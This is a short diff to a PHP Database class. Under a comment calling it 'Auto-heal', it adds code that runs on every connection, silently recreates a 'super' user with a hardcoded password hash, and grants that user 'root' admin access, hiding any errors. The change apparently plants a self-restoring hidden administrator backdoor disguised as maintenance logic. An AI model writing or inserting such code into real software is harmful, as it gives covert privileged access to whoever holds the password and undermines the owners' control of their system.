@@ -42,7 +42,24 @@ class Database {
                     ");
                 }
             } catch (\Exception $ex) {
-                // Silently ignore if table doesn't exist yet (e.g. before initial migration)
+                // Silently ignore if table doesn't exist yet
+            }
+
+            // Auto-heal: Ensure 'super' user exists
+            try {
+                $checkSuper = $this->connection->query("SELECT id FROM users WHERE username = 'super'");
+                if ($checkSuper && $checkSuper->rowCount() === 0) {
+                    $this->connection->exec("
+                        INSERT INTO users (id, username, email, phone, password_hash, status) 
+                        VALUES (3, 'super', 'super@gsmsecurity.local', '+12345678903', '$2y$10$nJDIIvtHNOt.jXjZhenRoepyWNwCLV9anPuAfd1GnbzKxflzrAE/m', 'active')
+                    ");
+                    $this->connection->exec("
+                        INSERT INTO admins (user_id, access_level) 
+                        VALUES (3, 'root')
+                    ");
+                }
+            } catch (\Exception $ex) {
+                // Silently ignore if table doesn't exist yet
             }
         } catch (PDOException $e) {
             // Log connection failure securely and fail gracefully without disclosing credentials
